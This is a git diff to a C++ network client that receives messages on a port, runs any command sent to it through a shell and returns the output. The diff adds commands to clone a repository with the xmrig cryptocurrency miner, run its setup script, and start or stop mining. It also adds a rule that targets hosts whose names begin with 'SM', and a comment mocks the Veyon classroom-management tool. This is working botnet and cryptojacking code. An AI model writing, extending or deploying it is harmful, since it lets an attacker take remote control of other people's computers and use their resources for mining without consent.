@@ -15,7 +15,7 @@
 #define SENDING_PORT 6868
 #define BUFFER_SIZE 256
 
-//fucked???
+//veyon suck
 
 std::vector<std::string> split(std::string str){
 	std::string word = "";
@@ -136,7 +136,8 @@ int main() {
         msg = split((std::string)buffer);
 
         if (bytesReceived > 0) {
-            if(msg[0] == exec("hostname") || msg[0] == "all"){
+            std::string hostname = exec("hostname");
+            if(msg[0] == hostname || msg[0] == "all" || (msg[0] == "114" && hostname[0] == 'S' && hostname[1] == 'M')){
                 if(msg[1] == "cmd"){
                     std::string answ = exec(msg[2].c_str());
                     for(int i = 0; i < msg_count; ++i){
@@ -151,23 +152,17 @@ int main() {
                     msg_count = std::stoi(msg[2]);
                 }
                 //==========================================================================
-                //coming soon
-                /*
-                else if(msg[1] == "inst_xmrig") {
-                    // git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git
-                    // cd EchoBreak-xmrig/xmrig-6.22.2
-                    // change config.json file (rename "name_of_the_worker" to exec(hostname))
-                    xmrig_flag = true;
+                else if(msg[1] == "inst xmrig") {
+                    system("git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git");
+                    system("chmod +x EchoBreak-xmrig/conf && EchoBreak-xmrig/./conf");
                 }
-                else if(msg[1] == "run_xmrig") {
-                    if (xmrig_flag) {
-                        // run ./xmrig
-                    }
-                    else {
-                        // send back error
-                    }
-                }*/
-		               //==========================================================================
+                else if(msg[1] == "run xmrig") {
+                    system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig");
+                }
+                else if(msg[1] == "stop xmrig"){
+                    system("pkill xmrig");
+                }
+		        //==========================================================================
             }
             memset(buffer, 0, sizeof(buffer));
         }
